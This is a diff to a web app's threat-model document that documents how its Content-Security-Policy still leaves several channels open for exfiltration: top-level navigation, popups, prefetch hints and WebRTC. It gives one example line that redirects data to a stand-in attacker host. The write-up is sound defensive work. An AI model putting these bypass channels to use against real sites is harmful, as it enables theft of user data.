@@ -111,12 +111,18 @@ bump (nothing merges automatically).
 **Residual risk: reduced, not eliminated.** A `<meta http-equiv>`
 Content-Security-Policy ([#223](https://github.com/DocGerd/sail_command/issues/223))
 now restricts `connect-src` to `'self'`, Open-Meteo, and aisstream.io — a
-compromised bundle cannot exfiltrate to an arbitrary origin. It does not stop
-exfiltration to those three already-allowed destinations (e.g. abusing the
-Open-Meteo connection as a covert channel), and dependency review is still one
-person reading a diff. Partially bounded by the app holding little worth
-stealing: no credentials except an optional AIS key the user supplies and can
-revoke.
+compromised bundle cannot make **background requests** (fetch/XHR/WebSocket/
+`sendBeacon`) to an arbitrary origin. `connect-src` governs only that traffic
+class; it does not restrict top-level navigation (`location.href =
+'https://evil.example/?d=' + data` — CSP3's `navigate-to` directive was never
+shipped in browsers), `window.open`, `<link rel="dns-prefetch"/"preconnect">`,
+or WebRTC (no `webrtc` directive is set, and WebRTC does **not** fall back to
+`default-src`) — all remain viable, if noisier, exfiltration channels, and
+exfiltration to the three already-allowed destinations (e.g. abusing the
+Open-Meteo connection as a covert channel) is also unrestricted. Dependency
+review is still one person reading a diff. Partially bounded by the app
+holding little worth stealing: no credentials except an optional AIS key the
+user supplies and can revoke.
 
 ### T2 — Hostile GPX import
 
@@ -322,7 +328,8 @@ Listing these is part of the argument's honesty, not an aside.
 
 | Gap | Impact | Status |
 |---|---|---|
-| CSP meta form cannot express `frame-ancestors`/`report-uri` | No framing protection and no automated violation reporting; both accepted for a static host with no framing threat model and no collector to report to | Closed — [#223](https://github.com/DocGerd/sail_command/issues/223) added the CSP and referrer policy this gap previously lacked entirely; the meta-tag limitation itself is a known, accepted residual, not an open item |
+| CSP meta form cannot express `frame-ancestors`/`report-uri` | No framing protection and no automated violation reporting | Accepted — [#223](https://github.com/DocGerd/sail_command/issues/223); static host, no framing threat model in play, no collector to report to |
+| `connect-src` restricts background requests only — top-level navigation, `window.open`, DNS-prefetch/preconnect, and WebRTC are unrestricted | A compromised bundle can still exfiltrate via a `location.href` redirect, a popup, prefetch/preconnect hints, or a WebRTC data channel (raises the impact of [T1](#t1--supply-chain-compromise-of-a-bundled-dependency)) | Accepted — [#223](https://github.com/DocGerd/sail_command/issues/223); CSP3's `navigate-to` directive was never shipped in browsers, and WebRTC has no `default-src` fallback to restrict it with |
 | Releases and tags unsigned | Downstream cannot verify authenticity ([T5](#t5--tampering-between-the-repository-and-the-users-browser)) | Open — [#222](https://github.com/DocGerd/sail_command/issues/222) |
 | Statement coverage unmeasured | The test suite is substantial and CI-gated, but no coverage figure is claimed because none is measured | Open — [#221](https://github.com/DocGerd/sail_command/issues/221) |
 | No Python linter or formatter for `pipeline/` | Build-time code only, never runs for users; still an unenforced-standards gap | Open — [#220](https://github.com/DocGerd/sail_command/issues/220) |
